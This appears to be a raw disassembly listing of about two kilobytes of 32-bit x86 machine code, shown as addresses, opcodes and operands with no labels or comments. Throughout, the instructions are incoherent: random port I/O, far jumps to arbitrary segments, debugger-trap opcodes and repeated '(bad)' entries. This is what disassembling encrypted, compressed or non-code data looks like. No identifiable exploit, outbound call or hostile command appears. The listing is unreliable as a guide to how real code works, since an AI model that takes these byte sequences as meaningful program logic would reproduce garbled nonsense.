  41b1e8:	mov    edx,0x6887aea1
  41b1ed:	outs   dx,BYTE PTR ds:[esi]
  41b1ee:	lea    esp,[edx]
  41b1f0:	cmp    ecx,DWORD PTR [ebx]
  41b1f2:	cld    
  41b1f3:	inc    esp
  41b1f4:	or     DWORD PTR [edx-0x583072be],ebp
  41b1fa:	pop    edi
  41b1fb:	into   
  41b1fc:	mov    ebp,0x67f12ac1
  41b201:	popf   
  41b202:	out    0xfb,eax
  41b204:	inc    ecx
  41b205:	xchg   esp,eax
  41b206:	retf   0x3a9b
  41b209:	sbb    BYTE PTR [eax+0x133451d1],0x13
  41b210:	jecxz  0x41b28d
  41b212:	push   cs
  41b213:	cmp    ebx,edi
  41b215:	or     BYTE PTR [eax+0x31],0xc5
  41b219:	adc    ecx,DWORD PTR [esi+eax*4+0x39]
  41b21d:	adc    eax,0xb6d1f981
  41b222:	sbb    BYTE PTR [ebx],ah
  41b224:	or     BYTE PTR [ecx-0x61c4d8ab],0x32
  41b22b:	gs js  0x41b1c3
  41b22e:	xchg   BYTE PTR ds:0xbccc2893,bl
  41b234:	pop    edi
  41b235:	or     eax,0xabfbab64
  41b23a:	inc    ebp
  41b23b:	ins    DWORD PTR es:[edi],dx
  41b23c:	and    DWORD PTR [ecx],ecx
  41b23e:	push   esp
  41b23f:	test   al,0xb8
  41b241:	outs   dx,DWORD PTR ds:[esi]
  41b242:	push   0xbb9260da
  41b247:	into   
  41b248:	mov    ebp,0x3168e0b0
  41b24d:	pop    ebp
  41b24e:	lahf   
  41b24f:	mov    ds:0xe777e73c,al
  41b254:	cs xchg esi,eax
  41b256:	jne    0x421739c0
  41b25c:	jnp    0x41b1de
  41b25e:	aad    0xc9
  41b260:	mov    ecx,DWORD PTR [edi-0x5b5b251e]
  41b266:	push   0x81c1e06c
  41b26b:	mov    al,0x28
  41b26d:	sbb    eax,0xf9a48e7d
  41b272:	je     0x41b22c
  41b274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b275:	not    DWORD PTR [edi+0x1c]
  41b278:	push   0xffffffc5
  41b27a:	mov    bh,0xc3
  41b27c:	dec    ecx
  41b27d:	adc    BYTE PTR [eax-0x796fb45e],cl
  41b283:	sbb    eax,DWORD PTR [ecx-0x2]
  41b286:	jge    0x41b236
  41b288:	or     ebp,ecx
  41b28a:	leave  
  41b28b:	jp     0x41b2af
  41b28d:	inc    edi
  41b28e:	adc    eax,0x274fb844
  41b293:	mov    dh,0xbd
  41b295:	fwait
  41b296:	cli    
  41b297:	pop    edx
  41b298:	into   
  41b299:	sub    DWORD PTR [ebp+0x50],edi
  41b29c:	xchg   ecx,eax
  41b29d:	out    0xf7,eax
  41b29f:	pop    es
  41b2a0:	pop    es
  41b2a1:	int3   
  41b2a2:	test   eax,0x759505f6
  41b2a7:	(bad)  
  41b2a8:	fisub  WORD PTR [esi+0x24258802]
  41b2ae:	mov    ds:0x5ef209fb,al
  41b2b3:	popf   
  41b2b4:	cmp    esp,ecx
  41b2b6:	cmc    
  41b2b7:	lods   eax,DWORD PTR ds:[esi]
  41b2b8:	xor    DWORD PTR [ecx+0x1795fb55],esi
  41b2be:	jmp    0xad955079
  41b2c3:	jnp    0x41b2c3
  41b2c5:	dec    edx
  41b2c6:	aaa    
  41b2c7:	ss sahf 
  41b2c9:	xchg   ebp,eax
  41b2ca:	fist   DWORD PTR [ebx+0x3b]
  41b2cd:	dec    ebp
  41b2ce:	pop    ebx
  41b2cf:	push   ss
  41b2d0:	icebp  
  41b2d1:	inc    esi
  41b2d2:	inc    eax
  41b2d3:	bound  edx,QWORD PTR [eax]
  41b2d5:	fisttp WORD PTR [eax]
  41b2d7:	ins    DWORD PTR es:[edi],dx
  41b2d8:	push   esp
  41b2d9:	ror    cl,0x16
  41b2dc:	adc    al,0x80
  41b2de:	lds    edx,FWORD PTR [ecx-0x80]
  41b2e1:	mov    bh,al
  41b2e3:	in     eax,dx
  41b2e4:	int    0xcc
  41b2e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2e7:	not    BYTE PTR [esi]
  41b2e9:	outs   dx,DWORD PTR ds:[esi]
  41b2ea:	pop    ebx
  41b2eb:	cmp    eax,0x79460e85
  41b2f0:	fisttp QWORD PTR [edi]
  41b2f2:	and    dh,BYTE PTR [eax+0x3d]
  41b2f5:	xchg   ebx,eax
  41b2f6:	pop    eax
  41b2f7:	in     eax,0x79
  41b2f9:	jae    0x41b319
  41b2fb:	lods   eax,DWORD PTR ds:[esi]
  41b2fc:	icebp  
  41b2fd:	lods   eax,DWORD PTR ds:[esi]
  41b2fe:	sti    
  41b2ff:	test   eax,0xf5c60920
  41b304:	jo     0x41b313
  41b306:	pushf  
  41b307:	out    dx,eax
  41b308:	sbb    ecx,ebp
  41b30a:	popf   
  41b30b:	aas    
  41b30c:	outs   dx,DWORD PTR ds:[esi]
  41b30d:	sbb    DWORD PTR [ebx-0xa07a998],esi
  41b313:	and    BYTE PTR [edx+0x8b83776],dl
  41b319:	sahf   
  41b31a:	mov    esp,0xaaf9bff
  41b31f:	mov    al,0xd2
  41b321:	jl     0x41b2c3
  41b323:	sti    
  41b324:	mov    ebp,0x3f9d3ff5
  41b329:	bound  esp,QWORD PTR [eax-0x6d]
  41b32c:	lea    edi,[edi-0x14903ce6]
  41b332:	cli    
  41b333:	mov    ebp,0x1a59ab8d
  41b338:	jo     0x41b39d
  41b33a:	push   0xffffffd1
  41b33c:	adc    eax,0xad918c83
  41b341:	mov    dl,0x10
  41b343:	fidiv  DWORD PTR [esi-0x23]
  41b346:	ret    0x3555
  41b349:	lods   al,BYTE PTR ds:[esi]
  41b34a:	mov    al,0xd0
  41b34c:	sub    BYTE PTR [edi-0xd],bh
  41b34f:	cmp    edx,DWORD PTR [edi+0x6c]
  41b352:	(bad)
  41b356:	pop    eax
  41b357:	mov    al,ds:0x3c226763
  41b35c:	(bad)  
  41b35d:	xchg   edi,eax
  41b35e:	cmp    al,0x97
  41b360:	xor    eax,DWORD PTR [edi+0x27]
  41b363:	add    eax,0x64a2e572
  41b368:	fbstp  TBYTE PTR [edi-0x67]
  41b36b:	out    dx,eax
  41b36c:	jno    0x41b3ba
  41b36e:	aam    0xec
  41b370:	aad    0x98
  41b372:	push   ecx
  41b373:	pop    ebx
  41b374:	or     eax,0x9bd44a70
  41b379:	int3   
  41b37a:	pop    edi
  41b37b:	xor    DWORD PTR [esi+ebx*8],ebx
  41b37e:	stos   DWORD PTR es:[edi],eax
  41b37f:	test   BYTE PTR [ebp-0x4f2d30bc],bl
  41b385:	xchg   ebx,eax
  41b386:	ss push esi
  41b388:	test   eax,0x87cdf99d
  41b38d:	and    eax,DWORD PTR [edi+0x1c8dee3b]
  41b393:	(bad)  
  41b394:	sub    DWORD PTR [ebx],edi
  41b396:	jl     0x41b34c
  41b398:	fisttp DWORD PTR [ecx]
  41b39a:	and    al,dl
  41b39c:	inc    esi
  41b39d:	je     0x41b393
  41b39f:	push   esi
  41b3a0:	xor    BYTE PTR [eax-0x5c],al
  41b3a3:	sti    
  41b3a4:	dec    edx
  41b3a5:	aad    0xd4
  41b3a7:	push   ebp
  41b3a8:	sbb    DWORD PTR [edi-0x49a2f699],esp
  41b3ae:	jns    0x41b367
  41b3b0:	das    
  41b3b1:	pop    ebx
  41b3b2:	sub    BYTE PTR [ecx-0x56],0x3e
  41b3b6:	sub    ch,cl
  41b3b8:	data16 jle 0x41b3ad
  41b3bb:	sub    BYTE PTR [edi+0x6fb23560],0x67
  41b3c2:	shl    al,0xa3
  41b3c5:	mov    ch,0x2
  41b3c7:	sbb    DWORD PTR [ebp-0x4191c6c1],esp
  41b3cd:	mov    eax,ds:0x1cf1513b
  41b3d2:	cmp    al,BYTE PTR [ebx]
  41b3d4:	dec    edx
  41b3d5:	mov    esi,0x62bc62aa
  41b3da:	push   ds
  41b3db:	xor    DWORD PTR [edx-0x5],0xffffffc7
  41b3df:	sbb    bl,ch
  41b3e1:	xor    edx,edi
  41b3e3:	xor    ecx,ebx
  41b3e5:	(bad)  
  41b3e7:	xor    eax,DWORD PTR [eax+0x5d]
  41b3ea:	mov    ?,WORD PTR [ebp-0x4a]
  41b3ed:	pop    ebx
  41b3ee:	pop    edx
  41b3ef:	bound  ecx,QWORD PTR [esp+ecx*2]
  41b3f2:	in     al,dx
  41b3f3:	hlt    
  41b3f4:	push   es
  41b3f5:	xchg   ecx,eax
  41b3f6:	inc    edi
  41b3f7:	test   DWORD PTR [esi],0x766f87ee
  41b3fd:	jmp    0x41b401
  41b3ff:	push   ss
  41b400:	retf   0xe4b5
  41b403:	and    eax,0xedf75682
  41b408:	cmp    DWORD PTR [ebx+ebx*1],ebx
  41b40b:	(bad)  
  41b40c:	sbb    BYTE PTR [edx],bh
  41b40e:	jns    0x41b42f
  41b410:	pop    es
  41b411:	pop    esi
  41b412:	mov    edx,0xb2763493
  41b417:	mov    ecx,0x1c996e25
  41b41c:	xchg   edx,eax
  41b41d:	add    DWORD PTR [edx-0x33],ecx
  41b420:	scas   al,BYTE PTR es:[edi]
  41b421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b422:	xor    dl,BYTE PTR [eax+0x33622029]
  41b428:	add    DWORD PTR [ebx-0x63c11e6a],ecx
  41b42e:	inc    ebp
  41b42f:	push   ss
  41b430:	adc    eax,0x3a8f8961
  41b435:	or     DWORD PTR [ecx],0x633c207e
  41b43b:	nop
  41b43c:	mov    edi,0xa4804531
  41b441:	xor    BYTE PTR [ebx],al
  41b443:	stos   DWORD PTR es:[edi],eax
  41b444:	pushf  
  41b445:	js     0x41b41a
  41b447:	xlat   BYTE PTR ds:[ebx]
  41b448:	test   DWORD PTR [ebx],esp
  41b44a:	fwait
  41b44b:	ror    DWORD PTR [ebx+0x5db270f],0x72
  41b452:	xchg   esi,eax
  41b453:	loope  0x41b407
  41b455:	xor    ebx,DWORD PTR [edx-0x4c953f87]
  41b45b:	jb     0x41b47d
  41b45d:	scas   al,BYTE PTR es:[edi]
  41b45e:	lea    esi,[edx+0x56]
  41b461:	jnp    0x41b403
  41b463:	mov    ecx,0x2e37636c
  41b468:	mov    ds:0xe7a9bcbb,al
  41b46d:	cli    
  41b46e:	test   BYTE PTR ds:0xd31a253b,0x37
  41b475:	sub    BYTE PTR [ecx+0x63],bl
  41b478:	mov    gs,esp
  41b47a:	sbb    eax,0x3ff722f5
  41b47f:	mov    edi,0x5c5e26ae
  41b484:	pop    edi
  41b485:	out    dx,al
  41b486:	sbb    BYTE PTR [edx+0x5a39baf],cl
  41b48c:	push   ds
  41b48d:	ins    DWORD PTR es:[edi],dx
  41b48e:	cmp    BYTE PTR [edx],cl
  41b490:	sub    DWORD PTR [edx-0x50],edi
  41b493:	call   0xf48f:0xad6d3b3a
  41b49a:	mov    ch,0x92
  41b49c:	pop    ss
  41b49d:	das    
  41b49e:	js     0x41b4b2
  41b4a0:	mov    bl,0x4c
  41b4a2:	into   
  41b4a3:	es es popf 
  41b4a6:	xor    edi,DWORD PTR [ebp-0x821af7a]
  41b4ac:	push   edx
  41b4ad:	clc    
  41b4ae:	(bad)  
  41b4af:	repz mov ebp,0xba7c3a03
  41b4b5:	ja     0x41b4f9
  41b4b7:	out    dx,eax
  41b4b8:	shl    ebp,cl
  41b4ba:	push   ebp
  41b4bb:	jp     0x41b516
  41b4bd:	mov    BYTE PTR [edi],0x1c
  41b4c0:	int3   
  41b4c1:	sbb    al,0x2a
  41b4c3:	js     0x41b507
  41b4c5:	test   DWORD PTR ds:0xfa6be3cc,ebp
  41b4cb:	dec    esp
  41b4cc:	add    BYTE PTR [edx-0x56],ch
  41b4cf:	mov    bh,0x3c
  41b4d1:	lds    edx,FWORD PTR [ecx-0x1e]
  41b4d4:	push   0xffffffbc
  41b4d6:	pop    edi
  41b4d7:	mov    ds:0x2f8e94c8,eax
  41b4dc:	das    
  41b4dd:	cmp    eax,0x6299187
  41b4e2:	cmp    BYTE PTR [esi],al
  41b4e4:	xor    eax,0x2637d61c
  41b4e9:	push   ebp
  41b4ea:	or     esi,ebx
  41b4ec:	dec    ebx
  41b4ed:	pop    ebp
  41b4ee:	es loopne 0x41b520
  41b4f1:	push   ebx
  41b4f2:	sar    DWORD PTR [ebx],cl
  41b4f4:	lods   eax,DWORD PTR ds:[esi]
  41b4f5:	cmp    eax,0x5fca62fb
  41b4fa:	stos   BYTE PTR es:[edi],al
  41b4fb:	pop    eax
  41b4fc:	sbb    edx,DWORD PTR [ebx+0x33098310]
  41b502:	and    DWORD PTR [ebp*2+0x7d6cd568],esi
  41b509:	sar    BYTE PTR [edx+0x28],cl
  41b50c:	xchg   esp,eax
  41b50d:	fist   WORD PTR [eax-0xbc28cd1]
  41b513:	fimul  WORD PTR [ecx]
  41b515:	xchg   ebx,eax
  41b516:	sub    ch,dh
  41b518:	mov    WORD PTR [ebx+0x9937016],ds
  41b51e:	cmp    bl,BYTE PTR [esi-0x71]
  41b521:	ror    DWORD PTR [ebp-0x1ff07a8],cl
  41b527:	adc    dl,BYTE PTR [esi-0x29]
  41b52a:	icebp  
  41b52b:	sub    DWORD PTR [eax],ecx
  41b52d:	ror    BYTE PTR [eax],1
  41b52f:	(bad)  
  41b531:	xchg   ecx,eax
  41b532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b533:	mov    ebx,0xac6cc1ab
  41b538:	xchg   esp,eax
  41b539:	inc    edx
  41b53a:	retf   
  41b53b:	mov    WORD PTR [ebx-0x3e],cs
  41b53e:	sahf   
  41b53f:	xchg   edi,eax
  41b540:	inc    ecx
  41b541:	push   edi
  41b542:	add    al,0xd
  41b544:	pop    DWORD PTR [ebx+0x135fb13c]
  41b54a:	or     DWORD PTR [ebx],0x128e267d
  41b550:	or     al,0x68
  41b552:	jo     0x41b58f
  41b554:	out    0xd2,eax
  41b556:	test   BYTE PTR [ebx],cl
  41b558:	repz adc eax,0x6d236327
  41b55e:	es sub eax,0xa3ea164c
  41b564:	xor    BYTE PTR [esi],dh
  41b566:	rcl    DWORD PTR [edx-0x3d128352],cl
  41b56c:	test   DWORD PTR [edi+0x11],ebp
  41b56f:	jmp    0x41b53e
  41b571:	push   ecx
  41b572:	mov    esp,0xcbc910b3
  41b577:	xchg   edx,eax
  41b578:	sub    ch,BYTE PTR [edx+eax*1]
  41b57b:	ret    
  41b57c:	cmp    eax,0xaa443d8d
  41b581:	jg     0x41b544
  41b583:	retf   0xa161
  41b586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b587:	in     al,dx
  41b588:	or     al,0xef
  41b58a:	sub    al,0x30
  41b58c:	push   0x4
  41b58e:	push   es
  41b58f:	rol    DWORD PTR [ebp+0x1d],cl
  41b592:	leave  
  41b593:	sub    DWORD PTR [edx+0x54],esp
  41b596:	ins    DWORD PTR es:[edi],dx
  41b597:	test   DWORD PTR [ebx+0x4d],ebx
  41b59a:	stos   DWORD PTR es:[edi],eax
  41b59b:	sbb    al,0x78
  41b59d:	push   ds
  41b59e:	sub    ebp,esp
  41b5a0:	mov    ds:0xf3eb5e5f,al
  41b5a5:	mov    esi,0x9a0487be
  41b5aa:	xchg   esi,eax
  41b5ab:	xor    eax,0x3de86037
  41b5b0:	outs   dx,BYTE PTR ds:[esi]
  41b5b1:	pop    edi
  41b5b2:	stos   DWORD PTR es:[edi],eax
  41b5b3:	jg     0x41b603
  41b5b5:	mov    cl,0x5e
  41b5b7:	es mov bl,0x9a
  41b5ba:	mov    BYTE PTR [esi+0x1f],cl
  41b5bd:	or     eax,0xe499115a
  41b5c2:	sub    al,0x2c
  41b5c4:	(bad)  
  41b5c5:	sub    BYTE PTR [edi+0x78],ah
  41b5c8:	inc    ebp
  41b5c9:	aas    
  41b5ca:	mov    cl,0x37
  41b5cc:	fsubp  st(1),st
  41b5ce:	call   0x9fab9477
  41b5d3:	add    DWORD PTR ds:0xc0d3c26e,esp
  41b5d9:	push   ebx
  41b5da:	dec    ecx
  41b5db:	mov    al,ds:0x1f41562a
  41b5e0:	neg    BYTE PTR [bp+di-0x7f]
  41b5e4:	std    
  41b5e5:	inc    ecx
  41b5e6:	lods   eax,DWORD PTR ds:[esi]
  41b5e7:	jcxz   0x41b645
  41b5ea:	inc    edx
  41b5eb:	pop    es
  41b5ec:	jge    0x41b582
  41b5ee:	adc    ch,cl
  41b5f0:	fldz   
  41b5f2:	mov    ds:0xc050c609,eax
  41b5f7:	fist   DWORD PTR [ebx+0x46]
  41b5fa:	mov    DWORD PTR [edx+eax*4-0x63],edi
  41b5fe:	mov    cs,WORD PTR [bp-0x1d]
  41b602:	xor    BYTE PTR [esi],dl
  41b604:	fwait
  41b605:	jno    0x41b5f8
  41b607:	test   DWORD PTR [esi-0x4f46e98d],0x9c7974b5
  41b611:	rcr    DWORD PTR [eax+0x7174f433],cl
  41b617:	inc    ebx
  41b618:	dec    edx
  41b619:	mov    cl,BYTE PTR [esi-0x6f]
  41b61c:	xchg   esi,eax
  41b61d:	jb     0x41b68f
  41b61f:	or     BYTE PTR [ebx],0xd
  41b622:	js     0x41b5b0
  41b624:	mul    DWORD PTR ds:0x63a52369
  41b62a:	call   ebx
  41b62c:	icebp  
  41b62d:	pop    ebp
  41b62e:	sbb    al,0x23
  41b630:	xchg   ecx,eax
  41b631:	test   DWORD PTR [ebp+0x6b],ebp
  41b634:	xor    esp,DWORD PTR [ebx-0x75ca765d]
  41b63a:	push   ebx
  41b63b:	cwde   
  41b63c:	test   DWORD PTR [ebx],esi
  41b63e:	fild   QWORD PTR ds:0x6470fbf8
  41b644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b645:	jg     0x41b692
  41b647:	lahf   
  41b648:	pusha  
  41b649:	enter  0x51bd,0xb7
  41b64d:	fcomp  DWORD PTR [ebp+0x6f514d55]
  41b653:	mov    al,0x95
  41b655:	push   ds
  41b656:	idiv   BYTE PTR ss:[edx-0x601e0b3a]
  41b65d:	mov    BYTE PTR [edx+0x2cf2709e],cl
  41b663:	dec    ecx
  41b664:	mov    esi,0x619e7f4
  41b669:	and    edx,DWORD PTR [esi+ecx*4+0x5b]
  41b66d:	or     al,0x75
  41b66f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b670:	mov    edx,0x929f3f1b
  41b675:	xor    DWORD PTR [ebp+ecx*8+0x62],esi
  41b679:	data16 mov dl,BYTE PTR [ebp+0x1c]
  41b67d:	mov    esi,0x8cb66db2
  41b682:	push   ebp
  41b683:	dec    edx
  41b684:	mov    dh,0x5c
  41b686:	cmp    BYTE PTR [ebp-0x5e9b68da],dl
  41b68c:	mov    ah,0x9
  41b68e:	fsub   st,st(6)
  41b690:	loope  0x41b6f9
  41b692:	outs   dx,BYTE PTR ds:[esi]
  41b693:	xor    BYTE PTR [ebx-0x10dab1c3],ah
  41b699:	lock outs dx,BYTE PTR ds:[esi]
  41b69b:	xchg   esp,eax
  41b69c:	ins    DWORD PTR es:[edi],dx
  41b69d:	ja     0x41b6ed
  41b69f:	xchg   BYTE PTR [edx+ebp*4-0x363e6a67],ah
  41b6a6:	stc    
  41b6a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6a8:	popa   
  41b6a9:	dec    DWORD PTR [eax-0xe49233d]
  41b6af:	(bad)  
  41b6b0:	adc    eax,0x4c50a8ce
  41b6b5:	(bad)  
  41b6b7:	ret    
  41b6b8:	or     ah,BYTE PTR [eax]
  41b6ba:	pop    esp
  41b6bb:	pop    ss
  41b6bc:	icebp  
  41b6bd:	arpl   WORD PTR [ebx+0x53a070fa],bp
  41b6c3:	call   0x2ba7:0xde396cc8
  41b6ca:	ja     0x41b71d
  41b6cc:	xchg   esp,eax
  41b6cd:	in     eax,0x76
  41b6cf:	lods   al,BYTE PTR ds:[esi]
  41b6d0:	les    ecx,FWORD PTR [edx+0x39a4e509]
  41b6d6:	adc    eax,0x9b70068c
  41b6db:	popf   
  41b6dc:	aaa    
  41b6dd:	scas   al,BYTE PTR es:[edi]
  41b6de:	pop    eax
  41b6df:	mov    ch,0x54
  41b6e1:	dec    esi
  41b6e2:	cmp    al,0xdb
  41b6e4:	mov    bl,0x25
  41b6e6:	ins    BYTE PTR es:[edi],dx
  41b6e7:	or     DWORD PTR [edi],ebx
  41b6e9:	or     al,dh
  41b6eb:	jnp    0x41b73e
  41b6ed:	ret    0x9eda
  41b6f0:	xchg   esp,eax
  41b6f1:	sbb    eax,0xde3dd047
  41b6f6:	mov    ebx,0xee380961
  41b6fb:	jbe    0x41b6e7
  41b6fd:	pop    ecx
  41b6fe:	(bad)  
  41b700:	call   0xfcc7df15
  41b705:	mov    cl,0x4d
  41b707:	jae    0x41b75c
  41b709:	mov    bh,0x3b
  41b70b:	gs (bad) 
  41b70d:	cmc    
  41b70e:	in     al,0x8c
  41b710:	mov    ch,0x80
  41b712:	xchg   edx,eax
  41b713:	in     al,dx
  41b714:	scas   al,BYTE PTR es:[edi]
  41b715:	dec    ecx
  41b716:	iret   
  41b717:	lock or ah,BYTE PTR [ebx]
  41b71a:	or     DWORD PTR [ebp-0x77],ebx
  41b71d:	pop    esp
  41b71e:	in     eax,0x18
  41b720:	nop
  41b721:	fbld   TBYTE PTR [ebx+0x41]
  41b724:	(bad)  
  41b725:	in     al,0x59
  41b727:	cmp    ecx,DWORD PTR [esp+esi*4-0x41]
  41b72b:	test   al,0x41
  41b72d:	push   0x50
  41b72f:	rcl    DWORD PTR [edx],0x42
  41b732:	xsha256 (bad)
  41b733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b734:	push   edx
  41b735:	push   esp
  41b736:	aas    
  41b737:	jmp    0xc645f564
  41b73c:	pop    ecx
  41b73d:	mov    ah,0xf2
  41b73f:	lods   eax,DWORD PTR ds:[esi]
  41b740:	sub    ebx,ecx
  41b742:	stos   DWORD PTR es:[edi],eax
  41b743:	and    esp,ebp
  41b745:	xchg   ch,ah
  41b747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b748:	ss es mov edx,0xf0e05fca
  41b74f:	mov    DWORD PTR [edi],ecx
  41b751:	retf   0x6b8a
  41b754:	inc    ecx
  41b755:	adc    dh,BYTE PTR [edi+eax*8-0x74d07560]
  41b75c:	arpl   WORD PTR [ebx+0x4428f65d],ax
  41b762:	cmp    esp,DWORD PTR [edx-0x79]
  41b765:	sub    DWORD PTR [ecx-0x40],esp
  41b768:	adc    ebp,edi
  41b76a:	shl    BYTE PTR [esp+esi*1+0x633efbd5],1
  41b771:	push   esi
  41b772:	cld    
  41b773:	inc    esp
  41b774:	and    DWORD PTR [esi],ebp
  41b776:	test   DWORD PTR [edx+edi*1+0x2904a73],edx
  41b77d:	xor    ecx,DWORD PTR [ecx]
  41b77f:	xor    bl,BYTE PTR [eax+ecx*4]
  41b782:	inc    ebp
  41b783:	sbb    eax,0x2d8b638e
  41b788:	gs ja  0x41b7e6
  41b78b:	mov    WORD PTR [eax],ss
  41b78d:	xchg   ebx,eax
  41b78e:	sbb    al,0xb6
  41b790:	xchg   edi,eax
  41b791:	js     0x41b7f0
  41b793:	mov    eax,esi
  41b795:	call   DWORD PTR [edi]
  41b797:	xchg   BYTE PTR [edx-0x2021afe2],bl
  41b79d:	(bad)  
  41b79e:	jl     0x41b7c3
  41b7a0:	inc    edx
  41b7a1:	jno    0x41b759
  41b7a3:	mov    edi,0xfa029429
  41b7a8:	ss dec ebx
  41b7aa:	mov    ecx,0x732362a8
  41b7b0:	jne    0x41b7f6
  41b7b2:	pop    edx
  41b7b3:	pusha  
  41b7b4:	push   ebp
  41b7b5:	or     eax,0x84a93716
  41b7ba:	push   ebp
  41b7bb:	ja     0x41b76f
  41b7bd:	inc    edi
  41b7be:	jbe    0x41b7ef
  41b7c0:	mov    eax,0xbbb82b18
  41b7c5:	hlt    
  41b7c6:	loope  0x41b816
  41b7c8:	fnstenv [ebp+0x507f87bb]
  41b7ce:	iret   
  41b7cf:	sub    BYTE PTR [eax+0x29],bl
  41b7d2:	iret   
  41b7d3:	(bad)
  41b7d6:	das    
  41b7d7:	popa   
  41b7d8:	out    dx,al
  41b7d9:	imul   eax,DWORD PTR [esi+edi*1],0xc2b49e95
  41b7e0:	rcr    DWORD PTR [edi+eax*1],0x71
  41b7e4:	mov    ds:0xf5d11a7d,al
  41b7e9:	xchg   BYTE PTR [esi],bl
  41b7eb:	add    ebp,DWORD PTR [ecx-0x2e]
  41b7ee:	jae    0x41b7d9
  41b7f0:	cdq    
  41b7f1:	test   DWORD PTR [ebx-0x7a],ebx
  41b7f4:	in     al,0xf7
  41b7f6:	inc    esp
  41b7f7:	inc    edx
  41b7f8:	push   es
  41b7f9:	mov    eax,ds:0xfe263765
  41b7fe:	lahf   
  41b7ff:	aas    
  41b800:	pop    esp
  41b801:	in     eax,0x2
  41b803:	fmul   DWORD PTR [edi+0xcbf8581]
  41b809:	adc    BYTE PTR [edi+0x2f],dh
  41b80c:	pop    ecx
  41b80d:	fdivr  QWORD PTR [ecx+ecx*8+0x20aaf536]
  41b814:	or     BYTE PTR [eax+0x25],bl
  41b817:	shl    DWORD PTR [edx],cl
  41b819:	sti    
  41b81a:	out    0x9e,eax
  41b81c:	adc    al,0xde
  41b81e:	and    eax,0xb1129910
  41b823:	push   esp
  41b824:	cmp    eax,0x8eebc0f
  41b829:	sar    BYTE PTR [edx+0x67cabfea],0x22
  41b830:	(bad)  [ecx+0x61638f74]
  41b836:	push   ecx
  41b837:	xchg   esi,eax
  41b838:	bound  ecx,QWORD PTR [ebx+0x70]
  41b83b:	out    0xd8,al
  41b83d:	add    al,0x91
  41b83f:	stos   BYTE PTR es:[edi],al
  41b840:	sbb    BYTE PTR [esi-0x985b198],ah
  41b846:	data16 ficom DWORD PTR [ecx+0x70b5db9a]
  41b84d:	mov    eax,0xc924b26
  41b852:	in     eax,0x53
  41b854:	push   ecx
  41b855:	or     dl,BYTE PTR [edx+0x15dfe2fa]
  41b85b:	sar    BYTE PTR [ebp+edx*4+0x2bb238d6],0x43
  41b863:	xor    BYTE PTR [ecx-0x5],dl
  41b866:	repz fdivrp st(1),st
  41b869:	sub    bl,bh
  41b86b:	ret    0xbca
  41b86e:	pop    ss
  41b86f:	call   0x938aed02
  41b874:	adc    edx,ecx
  41b876:	jno    0x41b861
  41b878:	int3   
  41b879:	sub    ch,cl
  41b87b:	adc    ecx,ecx
  41b87d:	ins    BYTE PTR es:[edi],dx
  41b87e:	xchg   esp,eax
  41b87f:	fstp   TBYTE PTR [eax+0x2]
  41b882:	push   ecx
  41b883:	xchg   ebx,eax
  41b884:	dec    eax
  41b885:	sar    BYTE PTR [edx+0x683de75],cl
  41b88b:	xchg   esi,eax
  41b88c:	lock jnp 0x41b869
  41b88f:	mov    esi,0xb87ad33
  41b894:	out    0x15,eax
  41b896:	jmp    0xb58a:0x22ac3cbb
  41b89d:	xlat   BYTE PTR ds:[ebx]
  41b89e:	add    al,0x94
  41b8a0:	dec    ebx
  41b8a1:	push   edx
  41b8a2:	or     dh,BYTE PTR [eax]
  41b8a4:	daa    
  41b8a5:	bswap  esp
  41b8a7:	sub    eax,0xeaddf842
  41b8ac:	xchg   esi,eax
  41b8ad:	push   ds
  41b8ae:	rcr    BYTE PTR [edi+0x1cf98912],0x22
  41b8b5:	test   edi,ebp
  41b8b7:	or     DWORD PTR [ebx+0x18cddef4],ebx
  41b8bd:	out    dx,eax
  41b8be:	jge    0x41b85f
  41b8c0:	aad    0x2d
  41b8c2:	sub    al,0x8d
  41b8c4:	xor    BYTE PTR [ebx],dl
  41b8c6:	mov    bl,0x64
  41b8c8:	sar    dl,cl
  41b8ca:	enter  0x4fa8,0xd8
  41b8ce:	jno    0x41b91d
  41b8d0:	mov    cl,0x74
  41b8d2:	in     eax,dx
  41b8d3:	pop    edi
  41b8d4:	imul   esi,DWORD PTR [ecx],0x7d4d9ebb
  41b8da:	cmp    eax,DWORD PTR [edx]
  41b8dc:	lods   al,BYTE PTR ds:[esi]
  41b8dd:	adc    DWORD PTR [ecx-0x4f46d21b],esi
  41b8e3:	mov    di,0xfe2d
  41b8e7:	push   esp
  41b8e8:	sbb    eax,0x9227cc7c
  41b8ed:	test   al,0x7c
  41b8ef:	loopne 0x41b903
  41b8f1:	mov    al,ds:0x1f4ea0f7
  41b8f6:	sub    eax,0x962dd4d7
  41b8fb:	mov    WORD PTR [eax-0x6b],?
  41b8fe:	stc    
  41b8ff:	push   edi
  41b900:	pop    edx
  41b901:	popf   
  41b902:	mov    ecx,DWORD PTR [ebp-0x11ced9fe]
  41b908:	out    0xea,al
  41b90a:	jmp    0x66aa:0xb168a21e
  41b911:	mov    bh,0x7a
  41b913:	mov    ebx,0xea3b678e
  41b918:	dec    esp
  41b919:	and    eax,0xb63298d5
  41b91e:	xchg   edx,eax
  41b91f:	out    0xa4,al
  41b921:	(bad)  
  41b922:	repz and al,0xdd
  41b925:	sbb    al,0xa9
  41b927:	adc    DWORD PTR [edi],ebp
  41b929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b92a:	or     BYTE PTR [ecx],bl
  41b92c:	mov    edx,0xc54b1a26
  41b931:	repz xor bl,BYTE PTR [eax]
  41b934:	jb     0x41b8c0
  41b936:	test   DWORD PTR [ebp-0x19],ecx
  41b939:	ins    BYTE PTR es:[edi],dx
  41b93a:	xor    DWORD PTR [edi],edx
  41b93c:	in     al,0xd3
  41b93e:	fiadd  WORD PTR [eax+ecx*8+0x3a3d6d7f]
  41b945:	xlat   BYTE PTR ds:[ebx]
  41b946:	cmp    al,bl
  41b948:	mov    ah,0x5b
  41b94a:	mov    BYTE PTR [edx-0x5d],bl
  41b94d:	or     esp,DWORD PTR [ebx]
